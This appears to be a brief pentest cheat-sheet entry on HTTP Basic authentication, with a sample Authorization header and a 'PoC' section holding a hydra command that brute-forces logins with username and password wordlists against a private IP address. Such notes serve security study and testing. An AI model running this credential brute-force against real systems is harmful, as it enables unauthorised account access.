The "Basic" Hypertext Transfer Protocol (HTTP) authentication scheme transmits credentials as user-id/password pairs encoded using Base64.

## 1. Fingerprint

访问网站时的登录窗口

![](./../../../images/Basic_Auth/%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E6%97%B6%E7%9A%84%E7%99%BB%E5%BD%95%E7%AA%97%E5%8F%A3.png)

登录时的请求包

```
GET / HTTP/1.1
Host: 192.168.36.55:81
Authorization: Basic dXNlcjpwYXNzd2Q=


```

> `dXNlcjpwYXNzd2Q=` 为 Base 64 编码后的 `user:passwd` 

## 2. PoC

```
hydra 192.168.36.55 -s 81 http-get / -L username.txt -P password.txt -e ns -vV
```

---

References

- [The 'Basic' HTTP Authentication Scheme](https://datatracker.ietf.org/doc/html/rfc7617)